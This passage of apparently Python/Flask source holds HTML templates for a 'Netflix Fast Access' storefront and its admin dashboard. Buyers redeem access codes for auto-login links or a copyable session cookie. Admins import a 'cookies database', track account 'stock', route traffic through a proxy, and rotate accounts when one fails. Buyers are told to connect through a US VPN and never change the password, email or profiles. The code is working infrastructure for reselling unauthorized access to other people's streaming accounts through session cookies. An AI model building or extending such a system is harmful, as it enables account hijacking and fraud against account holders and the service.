                    data = { success: false, error: "Server Error (" + res.status + "). Please try again." };
                }
                return data;
            })
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = (I18N_DICTS[currentLang]?.btn_login || "🚀 LOGIN NOW (Generate Links)");
                if (data.success) {
                    if (data.plan || data.expire_date) {
                        badgePlan.innerText = (I18N_DICTS[currentLang]?.badge_plan || "📦 Plan:") + " " + (data.plan || "N/A");
                        badgeExpire.innerText = (I18N_DICTS[currentLang]?.badge_expire || "📅 Expire Date:") + " " + (data.expire_date || "N/A");
                        infoBadge.style.display = "flex";
                    }

                    if (data.cookie_json) {
                        cookieBoxWrapper.style.display = "block";
                        cookieBtn.onclick = function(e) { e.preventDefault(); copyCookie(data.cookie_json, this); };
                    } else {
                        cookieBoxWrapper.style.display = "none";
                    }

                    if (data.is_json) {
                        pcLink.style.display = "none";
                        mobileLink.style.display = "none";
                        tvLink.style.display = "none";
                        generalLink.style.display = "none";
                        statusText.innerText = "Fast Link API unavailable. Please click Copy Cookie below to use Extension:";
                        statusText.style.color = "#f39c12";
                    } else {
                        pcLink.href = data.pc_link;
                        mobileLink.href = data.mobile_link;
                        tvLink.href = data.tv_link;
                        generalLink.href = data.general_link || data.pc_link;
                        
                        pcLink.style.display = "flex";
                        mobileLink.style.display = "flex";
                        tvLink.style.display = "flex";
                        generalLink.style.display = "flex";
                        
                        statusText.innerText = "✅ Success! Select your device or open account settings below:";
                        statusText.style.color = "#2ecc71";
                    }
                    resultDiv.style.display = "flex";
                } else {
                    resultDiv.style.display = "flex";
                    statusText.innerText = "❌ Error: " + (data.error || "Failed to generate link.");
                    statusText.style.color = "#ff4757";
                    pcLink.style.display = "none";
                    mobileLink.style.display = "none";
                    tvLink.style.display = "none";
                    generalLink.style.display = "none";
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerHTML = (I18N_DICTS[currentLang]?.btn_login || "🚀 LOGIN NOW (Generate Links)");
                resultDiv.style.display = "flex";
                statusText.innerText = "Connection to server failed!";
                statusText.style.color = "#ff4757";
            });
        }
        
        function openReportModal() {
            let rawInput = document.getElementById("rawTokenInput").value.trim();
            if (!rawInput) {
                alert("Please enter your Access Code first!");
                return;
            }
            document.getElementById("reportModal").style.display = "flex";
        }
        
        function closeReportModal() {
            document.getElementById("reportModal").style.display = "none";
            document.getElementById("reportForm").reset();
            document.getElementById("reportStatus").innerText = "";
            document.getElementById("reportPreview").style.display = "none";
        }

        function previewImage(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function(e) {
                    var img = document.getElementById("reportPreview");
                    img.src = e.target.result;
                    img.style.display = "block";
                }
                reader.readAsDataURL(input.files[0]);
            }
        }
        
        function submitReport(event) {
            event.preventDefault();
            let rawInput = document.getElementById("rawTokenInput").value.trim();
            let fileInput = document.getElementById("reportImage");
            let file = fileInput.files[0];
            
            if (!file) {
                alert("Please select a screenshot!");
                return;
            }
            
            let btn = document.getElementById("submitReportBtn");
            let statusText = document.getElementById("reportStatus");
            
            btn.disabled = true;
            btn.innerHTML = "⏳ Uploading...";
            statusText.innerText = "";
            
            let formData = new FormData();
            formData.append("code", rawInput);
            formData.append("image", file);
            
            fetch("/api/submit_request", {
                method: "POST",
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = "Submit Report & Get Replacement";
                if (data.success) {
                    statusText.innerText = "🎉 " + (data.message || "Report confirmed. Account updated!");
                    statusText.style.color = "#2ecc71";
                    setTimeout(closeReportModal, 3500);
                } else {
                    statusText.innerText = "❌ " + data.error;
                    statusText.style.color = "#ff4757";
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerHTML = "Submit Report & Get Replacement";
                statusText.innerText = "Connection error while uploading!";
                statusText.style.color = "#ff4757";
            });
        }
        
        function toggleChat() {
            const chat = document.getElementById('chatWindow');
            chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
        }
        
        function sendChatMessage(presetMsg) {
            const input = document.getElementById('chatInput');
            const msg = presetMsg || input.value.trim();
            if(!msg) return;
            
            appendMessage(msg, 'user');
            if (!presetMsg) input.value = '';
            
            const typingId = appendMessage('...', 'ai');
            
            fetch('/api/chat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({message: msg})
            })
            .then(res => res.json())
            .then(data => {
                const typingEl = document.getElementById(typingId);
                if(data.success) {
                    typingEl.innerText = data.reply;
                } else {
                    typingEl.innerText = "Error: " + data.error;
                    typingEl.style.color = "#ff4757";
                }
                const msgsDiv = document.getElementById('chatMessages');
                msgsDiv.scrollTop = msgsDiv.scrollHeight;
            })
            .catch(err => {
                const typingEl = document.getElementById(typingId);
                typingEl.innerText = "Connection failed.";
                typingEl.style.color = "#ff4757";
            });
        }
        
        function appendMessage(text, sender) {
            const msgsDiv = document.getElementById('chatMessages');
            const msgEl = document.createElement('div');
            msgEl.className = 'chat-msg msg-' + sender;
            msgEl.innerText = text;
            const id = 'msg-' + Date.now();
            msgEl.id = id;
            msgsDiv.appendChild(msgEl);
            msgsDiv.scrollTop = msgsDiv.scrollHeight;
            return id;
        }

        window.addEventListener("DOMContentLoaded", () => {
            const savedCustom = localStorage.getItem("preferred_lang_custom");
            if (savedCustom) {
                try {
                    const parsed = JSON.parse(savedCustom);
                    I18N_DICTS[parsed.name] = parsed.dict;
                    setLanguage(parsed.name);
                    return;
                } catch(e){}
            }
            const saved = localStorage.getItem("preferred_lang");
            if (saved && I18N_DICTS[saved]) {
                setLanguage(saved);
            }
        });
    </script>
    <style>
        .lang-bar {
            display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap;
            gap: 10px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 14px; padding: 10px 16px; margin-bottom: 25px;
        }
        .lang-pills { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
        .lang-pill {
            background: rgba(255, 255, 255, 0.06); color: #ccc; border: 1px solid rgba(255, 255, 255, 0.12);
            padding: 6px 12px; border-radius: 20px; font-size: 0.82rem; cursor: pointer; font-weight: 600;
            transition: all 0.2s;
        }
        .lang-pill:hover, .active-lang { background: #00a8ff; color: white; border-color: #00a8ff; }
        .lang-custom-box { display: flex; gap: 6px; align-items: center; }
        .lang-custom-input {
            padding: 6px 12px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 20px; color: #fff; font-size: 0.82rem; outline: none; width: 170px;
        }
        .lang-custom-btn {
            background: linear-gradient(135deg, #00a8ff, #9c88ff); color: white; border: none;
            padding: 6px 12px; border-radius: 20px; font-size: 0.82rem; font-weight: 700; cursor: pointer;
        }
        .rules-card {
            background: rgba(241, 196, 15, 0.04);
            border: 1px solid rgba(241, 196, 15, 0.25);
            border-radius: 16px; padding: 20px; margin-bottom: 25px;
        }
        .rules-title {
            color: #f1c40f; font-weight: 800; font-size: 1.05rem; margin-top: 0; margin-bottom: 12px;
            display: flex; align-items: center; gap: 8px;
        }
        .rules-list { display: flex; flex-direction: column; gap: 8px; font-size: 0.88rem; color: #dcdde1; line-height: 1.45; }
        .chat-widget { position: fixed; bottom: 20px; right: 20px; z-index: 1000; }
        .chat-button {
            background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; border: none; border-radius: 30px;
            padding: 12px 22px; font-size: 15px; cursor: pointer; font-family: inherit; font-weight: bold;
            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4); display: flex; align-items: center; gap: 8px;
            transition: transform 0.2s;
        }
        .chat-button:hover { transform: scale(1.05); }
        .chat-window {
            display: none; position: fixed; bottom: 85px; right: 20px; width: 340px;
            background: #161a2b; border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.15); box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            flex-direction: column; overflow: hidden; z-index: 1000;
        }
        .chat-header {
            background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; padding: 14px 18px; font-weight: bold;
            display: flex; justify-content: space-between; align-items: center; font-size: 1.05rem;
        }
        .chat-messages {
            height: 320px; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;
            background: rgba(0,0,0,0.2);
        }
        .chat-msg { max-width: 85%; padding: 10px 14px; border-radius: 12px; font-size: 0.9rem; word-wrap: break-word; white-space: pre-wrap; }
        .msg-user { background: #00a8ff; color: white; align-self: flex-end; border-bottom-right-radius: 2px; }
        .msg-ai { background: rgba(255,255,255,0.08); color: #eee; align-self: flex-start; border-bottom-left-radius: 2px; border: 1px solid rgba(255,255,255,0.1); }
        .chat-pills { display: flex; gap: 6px; padding: 8px 12px; background: rgba(0,0,0,0.4); overflow-x: auto; white-space: nowrap; }
        .chat-pill { background: rgba(255,255,255,0.1); color: #ddd; font-size: 0.75rem; padding: 5px 10px; border-radius: 15px; cursor: pointer; border: 1px solid rgba(255,255,255,0.15); }
        .chat-pill:hover { background: #00a8ff; color: white; }
        .chat-input-area { display: flex; padding: 12px; background: #0e111d; border-top: 1px solid rgba(255,255,255,0.1); }
        .chat-input {
            flex: 1; padding: 10px 15px; background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.15);
            border-radius: 20px; outline: none; font-family: inherit; font-size: 0.9rem;
        }
        .chat-send { background: transparent; color: #2ecc71; border: none; font-size: 20px; cursor: pointer; padding: 0 8px; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Language Selector Bar -->
        <div class="lang-bar">
            <div class="lang-pills">
                <span style="font-size: 0.85rem; font-weight: 700; color: #00a8ff; margin-right: 4px;" data-i18n="lang_label">🌐 Language:</span>
                <button type="button" class="lang-pill active-lang" data-lang="en" onclick="setLanguage('en')">🇺🇸 English</button>
                <button type="button" class="lang-pill" data-lang="vi" onclick="setLanguage('vi')">🇻🇳 Tiếng Việt</button>
                <button type="button" class="lang-pill" data-lang="es" onclick="setLanguage('es')">🇪🇸 Español</button>
                <button type="button" class="lang-pill" data-lang="pt" onclick="setLanguage('pt')">🇵🇹 Português</button>
                <button type="button" class="lang-pill" data-lang="pl" onclick="setLanguage('pl')">🇵🇱 Polski</button>
            </div>
            <div class="lang-custom-box">
                <input type="text" id="customLangInput" class="lang-custom-input" placeholder="Type any language (e.g. Russian)..." data-i18n-placeholder="lang_custom_ph" onkeypress="if(event.key==='Enter') translateWithAI()">
                <button type="button" id="customLangBtn" class="lang-custom-btn" onclick="translateWithAI()" data-i18n="lang_custom_btn">✨ AI Translate</button>
            </div>
        </div>

        <div class="header">
            <h1 data-i18n="portal_title">🎬 NETFLIX FAST ACCESS</h1>
            <p data-i18n="portal_subtitle">Automated Instant Login Portal • No Password Needed</p>
        </div>

        <!-- 4 Step Guide Card -->
        <div class="glass-panel" style="border: 1px solid rgba(0, 168, 255, 0.3); background: rgba(16, 22, 40, 0.85); margin-bottom: 25px;">
            <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: 800; font-size: 1.1rem; color: #00a8ff; display: flex; align-items: center; gap: 8px;" data-i18n="steps_header">
                ⚡ 4 EASY STEPS TO LOGIN
            </h3>
            <div class="steps-container">
                <div class="step-card">
                    <span class="step-num">Step 1</span>
                    <div class="step-title" data-i18n="step1_title">🌐 Connect to US VPN</div>
                    <div class="step-desc" data-i18n="step1_desc">Open free <strong>Windscribe VPN</strong> and connect to <strong>USA (Los Angeles)</strong>.</div>
                </div>
                <div class="step-card">
                    <span class="step-num">Step 2</span>
                    <div class="step-title" data-i18n="step2_title">🔑 Enter Access Code</div>
                    <div class="step-desc" data-i18n="step2_desc">Paste your 5 to 15 character <strong>Access Code</strong> from your order below.</div>
                </div>
                <div class="step-card">
                    <span class="step-num">Step 3</span>
                    <div class="step-title" data-i18n="step3_title">🚀 Select Device</div>
                    <div class="step-desc" data-i18n="step3_desc">Click <strong>LOGIN NOW</strong> and choose your device: PC, Mobile, Smart TV, or General.</div>
                </div>
                <div class="step-card">
                    <span class="step-num">Step 4</span>
                    <div class="step-title" data-i18n="step4_title">🎬 Stream & Enjoy</div>
                    <div class="step-desc" data-i18n="step4_desc">Once logged in successfully, you can <strong>disconnect VPN</strong> to stream at full speed!</div>
                </div>
            </div>
        </div>

        <!-- Important Rules & Warranty Card -->
        <div class="rules-card">
            <div class="rules-title" data-i18n="rules_header">
                ⚠️ IMPORTANT RULES & USAGE GUIDELINES
            </div>
            <div class="rules-list">
                <div data-i18n="rule1">• <strong>Single Device Policy:</strong> Stream on 1 device at a time. Do not share your code or link.</div>
                <div data-i18n="rule2">• <strong>Account Protection:</strong> DO NOT change password, email, PIN, or modify profiles.</div>
                <div data-i18n="rule3">• <strong>US VPN Requirement:</strong> Always connect to US VPN (Windscribe - Los Angeles) before generating and opening links.</div>
                <div data-i18n="rule4">• <strong>Instant 24/7 Replacement:</strong> If you see an error screen (Expired/On Hold), click <strong>REPORT ERROR</strong> to upload a screenshot for an instant replacement.</div>
                <div data-i18n="rule5">• <strong>Support Schedule (GMT+7):</strong> 9:00 - 11:00 AM | 3:00 - 5:00 PM | 9:00 - 11:00 PM.</div>
            </div>
        </div>

        <div class="glass-panel">
            <h3 style="margin-top: 0; text-align: center; font-weight: 700; font-size: 1.2rem;" data-i18n="input_heading">Enter Access Code</h3>
            <input type="text" id="rawTokenInput" class="search-box" style="text-align: center; font-size: 1.3rem; letter-spacing: 3px; font-weight: 700;" placeholder="e.g. X9K2M1 or 49AD0GJY0YK4I6D" data-i18n-placeholder="input_placeholder">
            
            <div style="display: flex; gap: 12px; margin-top: 15px; flex-wrap: wrap;">
                <button id="submitBtn" onclick="generateQuickLinks()" class="btn-success" style="flex: 2; padding: 15px; font-size: 1.1rem; min-width: 220px;" data-i18n="btn_login">
                    🚀 LOGIN NOW (Generate Links)
                </button>
                <button id="reportBtn" onclick="openReportModal()" class="btn-danger" style="flex: 1; padding: 15px; font-size: 0.95rem; min-width: 180px;" data-i18n="btn_report">
                    ⚠️ REPORT ERROR (Instant Auto-Replace)
                </button>
            </div>
            
            <div id="quickLinksResult" style="display: flex; flex-direction: column; gap: 15px; margin-top: 25px; display: none;">
                <div id="accountInfoBadge" style="display: none; background: rgba(0, 168, 255, 0.1); border: 1px solid rgba(0, 168, 255, 0.3); border-radius: 12px; padding: 14px; justify-content: center; gap: 25px; flex-wrap: wrap; font-size: 1rem;">
                    <span id="badgePlan" style="color: #ffbe76; font-weight: 800;">📦 Plan: ---</span>
                    <span id="badgeExpire" style="color: #00a8ff; font-weight: 800;">📅 Expire Date: ---</span>
                </div>
                <p id="statusText" style="text-align: center; margin: 0; font-weight: bold; font-size: 1.05rem;"></p>
                
                <div class="device-grid">
                    <!-- Card 1: PC / Laptop (Profile Picker) -->
                    <a id="quickPcLink" class="device-card card-pc" href="#" target="_blank" onclick="showLoading(this)">
                        <div class="device-icon-box" style="background: rgba(0, 168, 255, 0.15); color: #00a8ff;">💻</div>
                        <div class="device-name" data-i18n="card_pc_name">PC / Laptop</div>
                        <div class="device-hint" data-i18n="card_pc_hint">Auto-login to Netflix Profile Selector ("Who's watching?") on Computer</div>
                        <div class="device-btn-action" style="background: #00a8ff;" data-i18n="card_pc_btn">💻 Launch on PC</div>
                    </a>
                    
                    <!-- Card 2: Mobile -->
                    <a id="quickMobileLink" class="device-card card-mobile" href="#" target="_blank" onclick="showLoading(this)">
                        <div class="device-icon-box" style="background: rgba(46, 204, 113, 0.15); color: #2ecc71;">📱</div>
                        <div class="device-name" data-i18n="card_mobile_name">Mobile / Tablet</div>
                        <div class="device-hint" data-i18n="card_mobile_hint">Open with Chrome or Brave browser on iPhone or Android</div>
                        <div class="device-btn-action" style="background: #2ecc71;" data-i18n="card_mobile_btn">📱 Open on Mobile</div>
                    </a>
                    
                    <!-- Card 3: Smart TV -->
                    <a id="quickTvLink" class="device-card card-tv" href="#" target="_blank" onclick="showLoading(this)">
                        <div class="device-icon-box" style="background: rgba(165, 94, 234, 0.15); color: #a55eea;">📺</div>
                        <div class="device-name" data-i18n="card_tv_name">Smart TV Code</div>
                        <div class="device-hint" data-i18n="card_tv_hint">Enter the 8-digit activation code displayed on your TV screen</div>
                        <div class="device-btn-action" style="background: #8854d0;" data-i18n="card_tv_btn">📺 Enter TV Code</div>
                    </a>
                    
                    <!-- Card 4: General / Account Info -->
                    <a id="quickGeneralLink" class="device-card card-general" href="#" target="_blank" onclick="showLoading(this)">
                        <div class="device-icon-box" style="background: rgba(241, 196, 15, 0.15); color: #f1c40f;">⚙️</div>
                        <div class="device-name" data-i18n="card_general_name">Account Info / General</div>
                        <div class="device-hint" data-i18n="card_general_hint">Direct access to Account settings, Membership plan & expiration details</div>
                        <div class="device-btn-action" style="background: #f39c12;" data-i18n="card_general_btn">⚙️ View Account</div>
                    </a>
                </div>

                <!-- Compact Copy Cookie Utility -->
                <div id="cookieBoxWrapper" style="display: none; margin-top: 15px; text-align: center;">
                    <button id="quickCookieBtn" type="button" class="btn" style="background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.15); color: #ccc; font-size: 0.85rem; padding: 10px 18px; border-radius: 10px; cursor: pointer;" data-i18n="copy_cookie_btn">
                        📋 Copy JSON Cookie (For Chrome Extension)
                    </button>
                </div>
            </div>
        </div>
        
        <div style="text-align: center; margin-top: 25px;">
            <a href="/admin" style="color: var(--text-sub); font-size: 0.85rem; text-decoration: none; opacity: 0.7;">🔒 Admin Dashboard</a>
        </div>
    </div>
    
    <!-- Report Modal -->
    <div id="reportModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeReportModal()">&times;</span>
            <h3 style="margin-top: 0; margin-bottom: 10px; color: #ff5252; display: flex; align-items: center; gap: 8px;" data-i18n="modal_title">
                ⚠️ Automated Error Report & Replacement
            </h3>
            <p style="margin-top: 0; font-size: 0.88rem; color: var(--text-sub); line-height: 1.4;" data-i18n="modal_desc">
                Upload a screenshot showing the error screen (Expired, Membership on hold, Screen limit). Our system will verify and automatically rotate your account 24/7!
            </p>
            <form id="reportForm" onsubmit="submitReport(event)">
                <input type="file" id="reportImage" accept="image/*" required onchange="previewImage(this)" style="width: 100%; padding: 12px; margin-bottom: 12px; background: rgba(0,0,0,0.3); border: 1px dashed rgba(255,255,255,0.2); color: #ccc; border-radius: 10px;">
                <img id="reportPreview" style="display: none; max-width: 100%; max-height: 150px; margin-bottom: 15px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
                <button type="submit" id="submitReportBtn" class="btn-danger" style="width: 100%; font-weight: bold; padding: 14px;" data-i18n="modal_submit">Submit Report & Get Replacement</button>
            </form>
            <p id="reportStatus" style="text-align: center; font-weight: bold; margin-top: 15px; margin-bottom: 0; font-size: 0.95rem;"></p>
        </div>
    </div>
    
    <!-- AI Chatbot Widget -->
    <div class="chat-widget">
        <button class="chat-button" onclick="toggleChat()">
            <span style="font-size: 20px;">💬</span> <span data-i18n="chat_btn">24/7 AI Support Assistant</span>
        </button>
    </div>
    
    <div class="chat-window" id="chatWindow">
        <div class="chat-header">
            <span data-i18n="chat_header">🤖 AI Support Assistant</span>
            <span style="cursor:pointer;" onclick="toggleChat()">&times;</span>
        </div>
        <div class="chat-messages" id="chatMessages">
            <div class="chat-msg msg-ai" data-i18n="chat_welcome">Hello! How can I help you with your Netflix access today?</div>
        </div>
        <div class="chat-pills">
            <span class="chat-pill" onclick="sendChatMessage('How to connect US VPN with Windscribe?')" data-i18n="chat_pill1">🌐 How to use VPN?</span>
            <span class="chat-pill" onclick="sendChatMessage('How to login Netflix on Smart TV?')" data-i18n="chat_pill2">📺 Smart TV Guide</span>
            <span class="chat-pill" onclick="sendChatMessage('My account shows membership on hold or error.')" data-i18n="chat_pill3">⚠️ Report account error</span>
        </div>
        <div class="chat-input-area">
            <input type="text" id="chatInput" class="chat-input" placeholder="Type a message..." onkeypress="if(event.key === 'Enter') sendChatMessage()">
            <button class="chat-send" onclick="sendChatMessage()">➤</button>
        </div>
    </div>
</body>
</html>
"""



ADMIN_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Admin Dashboard</h1>
            <p>Account & Access Key Management System</p>
            <a href="/" style="color: #3498db; text-decoration: none; margin-right: 15px;">[Back to Home]</a>
            <a href="/logout" style="color: #e74c3c; text-decoration: none;">[Logout]</a>
        </div>

        {% with messages = get_flashed_messages(with_categories=true) %}
          {% if messages %}
            {% for category, message in messages %}
              <div class="flash-message {% if category == 'error' %}flash-error{% elif category == 'warning' %}flash-warning{% endif %}">{{ message }}</div>
            {% endfor %}
          {% endif %}
        {% endwith %}

        <div class="glass-panel" style="border: 1px solid #3498db; margin-bottom: 20px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px;">
                <h3 style="margin: 0; font-weight: 400; color: #3498db;">📊 System Stock & Proxy</h3>
                <div style="display: flex; align-items: center; gap: 15px;">
                    <form action="/admin/toggle_share_mode" method="POST" style="margin: 0; display: flex; align-items: center; gap: 5px;">
                        <span style="font-size: 0.9rem; color: #aaa;">Share Mode (1 Code = 2 Accs):</span>
                        <label class="switch" style="position: relative; display: inline-block; width: 40px; height: 20px;">
                            <input type="checkbox" onChange="this.form.submit()" {% if share_mode_enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;">
                            <span class="slider round" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: {% if share_mode_enabled %}#2ecc71{% else %}#ccc{% endif %}; transition: .4s; border-radius: 20px;">
                                <span style="position: absolute; height: 16px; width: 16px; left: {% if share_mode_enabled %}22px{% else %}2px{% endif %}; bottom: 2px; background-color: white; transition: .4s; border-radius: 50%;"></span>
                            </span>
                        </label>
                    </form>
                    <span style="font-size: 0.9rem; color: #aaa;">Current Proxy: <strong style="color: #2ecc71; font-family: monospace;">{{ current_proxy }}</strong></span>
                </div>
            </div>
            <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                <div style="flex: 1; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 8px; min-width: 250px;">
                    <h4 style="margin-top: 0; color: #f1c40f; border-bottom: 1px solid #444; padding-bottom: 10px; font-weight: 400;">🔑 Access Codes (Sold)</h4>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Premium (15 chars):</span> <strong style="color: #fff;">{{ stats.codes.Premium }}</strong></div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Standard (10 chars):</span> <strong style="color: #fff;">{{ stats.codes.Standard }}</strong></div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Standard w/ Ads (8 chars):</span> <strong style="color: #fff;">{{ stats.codes.Standard_Ads }}</strong></div>
                    <div style="display: flex; justify-content: space-between;"><span>Basic (5 chars):</span> <strong style="color: #fff;">{{ stats.codes.Basic }}</strong></div>
                </div>
                <div style="flex: 1; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 8px; min-width: 250px;">
                    <h4 style="margin-top: 0; color: #2ecc71; border-bottom: 1px solid #444; padding-bottom: 10px; font-weight: 400;">📦 Accounts Vault (Stock)</h4>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Premium:</span> <strong style="color: #fff;">{{ stats.accounts.Premium }}</strong></div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Standard:</span> <strong style="color: #fff;">{{ stats.accounts.Standard }}</strong></div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Standard w/ Ads:</span> <strong style="color: #fff;">{{ stats.accounts.Standard_Ads }}</strong></div>
                    <div style="display: flex; justify-content: space-between;"><span>Basic:</span> <strong style="color: #fff;">{{ stats.accounts.Basic }}</strong></div>
                </div>
            </div>
        </div>

        <div class="glass-panel" style="border: 1px solid #c0392b;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-weight: 400; color: #ff7675;">⚠️ Pending Error Reports</h3>
            </div>
            
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>Code</th>
                            <th>Screenshot</th>
                            <th>Time</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for req in pending_requests %}
                        <tr>
                            <td style="font-weight: bold; font-family: monospace; font-size: 1.3rem; color: #f1c40f; letter-spacing: 2px;">{{ req.code }}</td>
                            <td>
                                <a href="{{ req.image_url }}" target="_blank">
                                    <img src="{{ req.image_url }}" alt="Screenshot" style="max-width: 100px; max-height: 50px; border-radius: 4px; border: 1px solid #555;">
                                </a>
                            </td>
                            <td style="font-size: 0.85rem; color: #888;">{{ req.created_at }}</td>
                            <td style="display: flex; gap: 10px; flex-wrap: wrap;">
                                <form action="/admin/request/{{ req.id }}/accept" method="POST" style="margin: 0;" onsubmit="return confirm('Accept this report? The system will automatically rotate the account for this code.');">
                                    <button type="submit" style="background: #27ae60; padding: 6px 12px; font-size: 0.8rem;">✅ Accept & Change</button>
                                </form>
                                <form action="/admin/request/{{ req.id }}/reject" method="POST" style="margin: 0;" onsubmit="return confirm('Reject this report?');">
                                    <button type="submit" style="background: #e74c3c; padding: 6px 12px; font-size: 0.8rem;">❌ Reject</button>
                                </form>
                            </td>
                        </tr>
                        {% else %}
                        <tr><td colspan="4" style="text-align: center; color: #666; padding: 20px;">No pending reports at the moment.</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>

        <div class="glass-panel">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-weight: 400;">Access Code Management (License Keys)</h3>
                <div style="display: flex; gap: 10px;">
                    <form action="/admin/generate_key" method="POST" style="margin: 0; display: flex; gap: 10px; align-items: center;" onsubmit="showLoading(this.querySelector('button'))">
                        <select name="plan_type" style="padding: 8px; border-radius: 4px; background: rgba(0,0,0,0.5); color: white; border: 1px solid #555;">
                            <option value="premium">Premium (15 Chars)</option>
                            <option value="standard">Standard (10 Chars)</option>
                            <option value="standard_ads">Standard Ads (8 Chars)</option>
                            <option value="basic">Basic (5 Chars)</option>
                        </select>
                        <select name="duration" style="padding: 8px; border-radius: 4px; background: rgba(0,0,0,0.5); color: white; border: 1px solid #555;">
                            <option value="1">1 Month</option>
                            <option value="2">2 Months</option>
                            <option value="3">3 Months</option>
                        </select>
                        <button type="submit" style="background: #27ae60; font-size: 0.9rem; padding: 10px 15px; white-space: nowrap;">+ Generate</button>
                    </form>
                </div>
            </div>
            
            <form action="/admin" method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
                <input type="text" name="search_code" class="search-box" placeholder="Search by 6-char code..." value="{{ request.args.get('search_code', '') }}">
                <button type="submit" style="background: #3498db; white-space: nowrap;">🔍 Search Code</button>
            </form>
            
            <div style="overflow-x: auto;">

                <table>
                    <thead>
                        <tr>
                            <th>Code</th>
                            <th>Assigned Email</th>
                            <th>Created At</th>
                            <th>Expire At</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for key in access_keys %}
                        <tr>
                            <td style="font-weight: bold; font-family: monospace; font-size: 1.3rem; color: #f1c40f; letter-spacing: 2px;">{{ key[0] }}</td>
                            <td>{{ key[1] }}</td>
                            <td style="font-size: 0.85rem; color: #888;">{{ key[2] }}</td>
                            <td style="font-size: 0.85rem; color: #e74c3c; font-weight: bold;">{{ key[3] if key[3] else 'Lifetime' }}</td>
                            <td style="display: flex; gap: 10px; flex-wrap: wrap;">
                                <button class="btn-copy" onclick="copyCookie('{{ key[0] }}', this)">Copy Code</button>
                                <form action="/admin/rotate_key/{{ key[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Do you want to rotate a new account for this code?');">
                                    <button type="submit" style="background: #f39c12; padding: 6px 12px; font-size: 0.8rem;">Change Acc</button>
                                </form>
                                <form action="/admin/delete_key/{{ key[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Delete this code? Customers will no longer be able to use it.');">
                                    <button type="submit" style="background: #e74c3c; padding: 6px 12px; font-size: 0.8rem;">Delete</button>
                                </form>
                            </td>
                        </tr>
                        {% else %}
                        <tr><td colspan="5" style="text-align: center; color: #666; padding: 20px;">No access codes generated yet.</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            
            {% if key_total_pages > 1 %}
            <div style="display: flex; justify-content: center; gap: 5px; margin-top: 15px;">
                {% if key_page > 1 %}
                <a href="?key_page={{ key_page - 1 }}&acc_page={{ acc_page }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">&laquo; Prev</a>
                {% endif %}
                <span style="padding: 5px 10px; color: #888;">Page {{ key_page }} / {{ key_total_pages }}</span>
                {% if key_page < key_total_pages %}
                <a href="?key_page={{ key_page + 1 }}&acc_page={{ acc_page }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">Next &raquo;</a>
                {% endif %}
            </div>
            {% endif %}
        </div>

        <div class="glass-panel">
            <h3 style="margin-top: 0; margin-bottom: 20px; font-weight: 400;">Import Cookies Database (Single File)</h3>
            <form style="display: flex; gap: 15px; align-items: center;" action="/upload" method="POST" enctype="multipart/form-data" onsubmit="showLoading(this.querySelector('button'))">
                <input type="file" name="account_file" accept=".txt" required style="padding: 10px; background: rgba(0,0,0,0.2); border: 1px dashed var(--border-color); color: #ccc;">
                <button type="submit">Upload Database</button>
            </form>
